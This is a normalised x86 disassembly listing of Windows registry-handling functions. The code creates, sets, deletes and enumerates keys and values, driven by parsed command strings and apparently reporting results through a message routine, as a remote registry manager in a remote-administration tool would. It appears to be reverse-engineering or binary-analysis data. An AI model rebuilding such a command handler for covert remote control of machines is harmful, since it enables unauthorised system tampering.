call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
xor al al
pop ebp
retn
push ebx
push esi
lea ecx [ ebp + 0x14 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::length@IAT ]
shl eax 0x1
push eax
lea ecx [ ebp + 0x14 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
xor ebx ebx
push [ ebp + 0x24 ]
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ RegSetValueExW@IAT ]
push [ ebp + 0xc ]
mov esi eax
call [ RegCloseKey@IAT ]
cmp esi ebx
jne r-xdata
lea ecx [ ebp + 0x14 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov al bl
pop esi
pop ebx
pop ebp
retn
mov bl 0x1
sub_40a6fe
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ RegCreateKeyA@IAT ]
test eax eax
jne r-xdata
xor al al
pop ebp
retn
push esi
lea eax [ ebp + 0x14 ]
push 0x4
push eax
push 0x4
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ RegSetValueExA@IAT ]
push [ ebp + 0xc ]
mov esi eax
call [ RegCloseKey@IAT ]
test esi esi
sete al
pop esi
pop ebp
retn
sub_40a743
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ RegCreateKeyA@IAT ]
test eax eax
jne r-xdata
xor al al
pop ebp
retn
push esi
lea eax [ ebp + 0x14 ]
push 0x8
push eax
push 0xb
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ RegSetValueExA@IAT ]
push [ ebp + 0xc ]
mov esi eax
call [ RegCloseKey@IAT ]
test esi esi
sete al
pop esi
pop ebp
retn
sub_40a788
push ebp
mov ebp esp
sub esp 0x410
push ebx
lea ecx [ ebp - 0x410 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
call sub_402a90
push [ ebp + 0x18 ]
lea eax [ ebp - 0x10 ]
lea ecx [ ebp - 0x410 ]
push [ ebp + 0x14 ]
push eax
call sub_402b93
push [ ebp + 0x24 ]
lea eax [ ebp - 0x10 ]
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40a624
add esp 0x20
lea ecx [ ebp - 0x10 ]
mov bl al
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov al bl
pop ebx
leave
retn
sub_40a7eb
push ebp
mov ebp esp
sub esp 0x44
lea eax [ ebp + 0x13 ]
push ebx
push eax
lea ecx [ ebp - 0x24 ]
push [ ebp + 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x14 ]
push eax
push [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call sub_410ee4
pop ecx
pop ecx
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
call sub_410ee4
pop ecx
pop ecx
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push [ ebp + 0x8 ]
call sub_40a878
add esp 0xc
lea ecx [ ebp - 0x34 ]
mov bl al
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov al bl
pop ebx
leave
retn
sub_40a878
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
push 0x2
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ RegDeleteValueW@IAT ]
neg eax
sbb al al
inc al
pop ebp
retn
xor al al
pop ebp
retn
sub_40a9b0
push ebp
mov ebp esp
mov eax 0x69d8
call sub_412450
mov al [ r--data ]
push ebx
push edi
push 0x40
mov [ ebp - 0x1c8 ] al
pop ecx
xor eax eax
lea edi [ ebp - 0x1c7 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x48 ]
xor ebx ebx
push eax
lea eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x50 ]
push eax
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x28 ]
push ebx
push eax
lea eax [ ebp - 0x1c8 ]
mov [ ebp - 0x28 ] 0x104
push eax
mov [ ebp - 0x8 ] ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x1c ] 0x3fff
call [ RegQueryInfoKeyA@IAT ]
cmp [ ebp - 0x8 ] ebx
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
xor edi edi
cmp [ ebp - 0x8 ] ebx
jbe r-xdata
pop edi
pop ebx
leave
retn
mov [ ebp - 0xc ] ebx
jbe r-xdata
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x20 ] 0xff
push eax
push ebx
push ebx
lea eax [ ebp - 0x20 ]
push ebx
push eax
lea eax [ ebp - 0x2c8 ]
push eax
push edi
push [ ebp + 0x8 ]
call [ RegEnumKeyExA@IAT ]
test eax eax
jne r-xdata
xor eax eax
lea edi [ ebp - 0x33 ]
mov [ ebp - 0x34 ] bl
mov [ ebp - 0x18 ] 0x2710
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x18 ]
mov [ ebp - 0x1c ] 0x3fff
push eax
lea eax [ ebp - 0x29d8 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x1c ]
push ebx
push eax
lea eax [ ebp - 0x69d8 ]
mov [ ebp - 0x69d8 ] bl
push eax
push [ ebp - 0xc ]
push [ ebp + 0x8 ]
call [ RegEnumValueA@IAT ]
test eax eax
jne r-xdata
inc edi
cmp edi [ ebp - 0x8 ]
jb r-xdata
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x64 ]
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x2c8 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x64 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
inc [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jb r-xdata
lea eax [ ebp - 0x34 ]
push 0xa
push eax
push [ ebp - 0x24 ]
call [ _itoa@IAT ]
add esp 0xc
lea eax [ ebp - 0x1 ]
mov edi r--data
lea ecx [ ebp - 0x94 ]
push eax
push edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x69d8 ]
push eax
lea eax [ ebp - 0x64 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
lea ecx [ ebp - 0x64 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x94 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x13 ]
lea ecx [ ebp - 0xb4 ]
push eax
push edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x74 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
lea ecx [ ebp - 0x74 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xb4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x11 ]
lea ecx [ ebp - 0x84 ]
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x12 ]
push eax
lea eax [ ebp - 0x29d8 ]
push [ ebp - 0x18 ]
lea ecx [ ebp - 0xa4 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0xc4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
lea ecx [ ebp - 0xc4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xa4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x84 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_40ac24
push ebp
mov ebp esp
push esi
mov esi [ std::operator==@IAT ]
lea eax [ ebp + 0x8 ]
push r--data
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
lea eax [ ebp + 0x8 ]
push r--data
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
mov esi 0x80000002
jmp r-xdata
lea eax [ ebp + 0x8 ]
push r--data
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
mov esi 0x80000001
jmp r-xdata
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax esi
jmp r-xdata
lea eax [ ebp + 0x8 ]
push r--data
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
mov esi 0x80000000
jmp r-xdata
pop esi
pop ebp
retn
lea eax [ ebp + 0x8 ]
push r--data
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
mov esi 0x80000003
jmp r-xdata
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov esi 0x80000005
sub_40acbd
push ebp
mov ebp esp
sub esp 0x74
push ebx
push esi
sub esp 0x10
lea eax [ ebp + 0x8 ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_40ac24
add esp 0x10
lea ecx [ ebp - 0x4 ]
xor ebx ebx
push ecx
push 0x20019
push ebx
push [ ebp + 0x18 ]
push eax
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
sub esp 0x10
lea eax [ ebp + 0x1f ]
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x72
mov ecx rw-data
call sub_402062
push [ ebp - 0x4 ]
call sub_40a9b0
cmp [ ebp + 0x1c ] bl
pop ecx
mov ecx r--data
je r-xdata
sub esp 0x10
mov eax rw-data
mov esi esp
push rw-data
push eax
push rw-data
push eax
push rw-data
push eax
push rw-data
push eax
lea eax [ ebp - 0x74 ]
push ecx
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x64 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x54 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x44 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x34 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x24 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x14 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx rw-data
push 0x71
call sub_402062
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x54 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x64 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x74 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov esi r--data
mov ecx rw-data
push esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push esi
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push esi
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push esi
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
mov bl 0x1
jmp r-xdata
mov ecx r--data
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov al bl
pop esi
pop ebx
leave
retn
sub_40ae55
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov edi [ eax ]
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
lea ecx [ ebp + 0xc ]
push [ eax ]
lea eax [ ebp - 0x2c ]
push 0x4
pop esi
push esi
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
sub esp 0x10
mov ecx esp
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub esp 0x10
lea eax [ ebp - 0x2c ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1c ]
push eax
call sub_41113a
mov eax edi
add esp 0x24
sub eax 0x35
je r-xdata
lea ecx [ ebp - 0x1c ]
xor ebx ebx
xor esi esi
call sub_4012b5
cmp eax 0x1
jbe r-xdata
dec eax
je r-xdata
push 0x1
push 0x1
lea ecx [ ebp - 0x1c ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov esi eax
push 0x2
lea ecx [ ebp - 0x1c ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x1
lea ecx [ ebp - 0x1c ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
xor ebx ebx
push eax
push ebx
lea ecx [ ebp - 0x1c ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_40ac24
add esp 0x10
push eax
call sub_40a7eb
add esp 0xc
cmp al bl
je r-xdata
dec eax
je r-xdata
sub esp 0x10
lea eax [ ebp - 0x8 ]
mov ecx esp
push eax
push r--data
jmp r-xdata
sub esp 0x10
lea eax [ ebp - 0x7 ]
mov ecx esp
push eax
push r--data
push r--data
push r--data
call [ LoadLibraryA@IAT ]
push eax
call [ GetProcAddress@IAT ]
push 0x1
lea ecx [ ebp - 0x1c ]
mov [ rw-data ] eax
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
xor ebx ebx
push eax
push ebx
lea ecx [ ebp - 0x1c ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_40ac24
add esp 0x10
push eax
call [ rw-data ]
cmp eax ebx
jne r-xdata
dec eax
je r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x72
mov ecx rw-data
call sub_402062
jmp r-xdata
push ebx
lea ecx [ ebp - 0x1c ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_40acbd
add esp 0x18
sub esp 0x10
lea eax [ ebp - 0x6 ]
mov ecx esp
push eax
push r--data
jmp r-xdata
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
lea ecx [ ebp - 0x1c ]
push [ eax ]
push 0x5c
push 0x1
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find_last_of@IAT ]
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
cmp eax [ ecx ]
jne r-xdata
push 0x3
lea ecx [ ebp - 0x1c ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
cmp eax esi
pop ecx
je r-xdata
dec eax
jne r-xdata
lea ecx [ ebp - 0x1c ]
call sub_401ad8
lea ecx [ ebp - 0x2c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
leave
retn
push eax
lea eax [ ebp - 0x4c ]
push ebx
push eax
push 0x1
lea ecx [ ebp - 0x1c ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
lea ecx [ ebp - 0x4c ]
mov esi eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
xor esi esi
jmp r-xdata
push esi
lea ecx [ ebp - 0x1c ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push [ eax ]
lea ecx [ ebp - 0x1c ]
push 0x2
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x1
lea ecx [ ebp - 0x1c ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
xor ebx ebx
push eax
push ebx
lea ecx [ ebp - 0x1c ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_40ac24
add esp 0x10
push eax
call sub_40a6fe
add esp 0x10
cmp eax 0xb
je r-xdata
xor ebx ebx
lea eax [ ebp - 0xc ]
push ebx
push eax
push ebx
push 0x20006
push ebx
push ebx
push ebx
push 0x1
lea ecx [ ebp - 0x1c ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push ebx
lea ecx [ ebp - 0x1c ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_40ac24
add esp 0x10
push eax
call [ RegCreateKeyExA@IAT ]
push [ ebp - 0xc ]
mov esi eax
call [ RegCloseKey@IAT ]
cmp esi ebx
jne r-xdata
push ebx
push esi
push ebx
lea ecx [ ebp - 0x1c ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_40acbd
pop ecx
lea eax [ ebp - 0x5 ]
pop ecx
mov ecx esp
push eax
push r--data
sub esp 0x10
lea eax [ ebp - 0x4 ]
mov ecx esp
push eax
push r--data
jmp r-xdata
sub esp 0x10
lea eax [ ebp - 0x3 ]
mov ecx esp
push eax
push r--data
jmp r-xdata
push esi
lea ecx [ ebp - 0x1c ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push [ eax + 0x4 ]
lea ecx [ ebp - 0x1c ]
push [ eax ]
push 0x2
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x1
lea ecx [ ebp - 0x1c ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
xor ebx ebx
push eax
push ebx
lea ecx [ ebp - 0x1c ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_40ac24
add esp 0x10
push eax
call sub_40a743
add esp 0x14
jmp r-xdata
push eax
push esi
lea ecx [ ebp - 0x1c ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x2
lea ecx [ ebp - 0x1c ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x1
lea ecx [ ebp - 0x1c ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
xor ebx ebx
push eax
push ebx
lea ecx [ ebp - 0x1c ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_40ac24
add esp 0x10
push eax
call sub_40a624
add esp 0x20
jmp r-xdata
sub esp 0x10
lea eax [ ebp - 0x2 ]
mov ecx esp
push eax
push r--data
jmp r-xdata
sub esp 0x10
lea eax [ ebp - 0x1 ]
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x72
mov ecx rw-data
call sub_402062
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
lea ecx [ ebp - 0x1c ]
push [ eax ]
push 0x5c
push 0x1
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find_last_of@IAT ]
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
cmp eax [ ecx ]
jne r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x72
mov ecx rw-data
call sub_402062
push ebx
push 0x1
lea ecx [ ebp - 0x1c ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
jmp r-xdata
cmp al bl
je r-xdata
push eax
lea eax [ ebp - 0x3c ]
push ebx
push eax
push 0x1
lea ecx [ ebp - 0x1c ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
lea ecx [ ebp - 0x3c ]
mov esi eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
xor esi esi
jmp r-xdata
push esi
push ebx
jmp r-xdata
sub_40b339
push ebp
mov ebp esp
push ebx
mov ebx rw-data
push esi
push edi
mov ecx ebx
call sub_401fd3
sub esp 0x10
mov esi rw-data
mov edi esp
mov ecx ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_402032
